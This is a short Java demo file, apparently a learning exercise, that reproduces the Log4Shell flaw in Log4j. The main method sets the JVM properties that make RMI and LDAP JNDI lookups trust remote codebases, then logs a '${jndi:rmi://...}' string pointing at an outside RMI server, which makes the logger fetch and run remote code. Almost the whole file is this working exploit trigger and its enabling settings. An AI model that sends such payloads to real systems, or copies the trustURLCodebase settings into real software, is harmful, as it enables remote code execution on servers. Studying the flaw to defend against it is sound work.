package com.zhengqing.demo.bug.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4j {
    
    private static final Logger log = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        log.error("test1: ${java:os}");
        log.error("test2: ${jndi:rmi://192.168.101.88:1099/app}");
    }

}
